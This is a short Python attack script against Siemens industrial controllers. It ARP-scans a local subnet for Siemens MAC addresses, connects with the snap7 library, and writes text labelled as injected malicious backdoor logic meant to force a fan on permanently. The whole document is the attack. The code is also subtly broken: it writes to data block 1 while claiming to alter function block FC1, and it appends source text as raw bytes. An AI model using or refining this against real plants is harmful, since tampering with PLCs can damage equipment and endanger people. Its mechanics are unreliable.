import snap7
from snap7.util import *
import struct
import scapy.all as scapy
import socket

# Scan for Siemens PLCs with ARP (or use alternative Broadcast method)
def discover_plc():
    print("[*] Scanning for Siemens S7 PLCs...")

    # Use ARP scan to discover PLC devices on network
    arp_result = scapy.arping("192.168.1.0/24", timeout=2, verbose=False)[0]
    for sent_pkt, received_pkt in arp_result:
        # Filter Siemens PLC MAC manufacturer: Example (Siemens MAC OUI starts with 00:0E:A4)
        if received_pkt.hwsrc.startswith("00:0E:A4"):
            print(f"[+] Siemens PLC Discovered: {received_pkt.psrc}")
            return received_pkt.psrc  # Return the discovered PLC IP

    print("[!] No Siemens PLCs found.")
    return None


# Connect to PLC and modify program
def modify_plc_logic(plc_ip):
    try:
        # Establish connection to PLC
        client = snap7.client.Client()
        client.connect(plc_ip, 0, 1)  # Slot 0, Rack 1 (Adjust if necessary)
        
        if client.get_connected():
            print(f"[+] Connected to PLC at {plc_ip}")

            ## Modify a program block (Example: FC1 - Motor Temp Control)

            added_logic = """
            // Injected Malicious Logic
            // Persistence Backdoor: Always Activate Fan_B
            IF AlwaysTRUE THEN
                SET("Activate_Fan_B");
            END_IF;
            """

            print("[*] Injecting new logic into FC1...")
            
            # Read the original program block (FC1)
            # Siemens uses block numbers for FC, FC1 is block 1
            fc1_block_data = client.db_read(1, 0, 256)  # Read first 256 bytes
            modified_block = fc1_block_data.decode(errors='ignore') + added_logic

            # Convert string back to bytes
            modified_block_bytes = bytearray(modified_block.encode())
            
            # Write modified logic to the PLC
            client.db_write(1, 0, modified_block_bytes)
            print("[+] Successfully modified FC1 with persistent logic.")

            # Close PLC connection
            client.disconnect()
        
        else:
            print("[!] Failed to connect to PLC.")

    except Exception as e:
        print(f"[ERROR] {e}")


# Main execution
if __name__ == "__main__":
    plc_ip = discover_plc()

    if plc_ip:
        print(f"[+] Target PLC IP: {plc_ip}")
        modify_plc_logic(plc_ip)
    else:
        print("[!] No target PLC found.")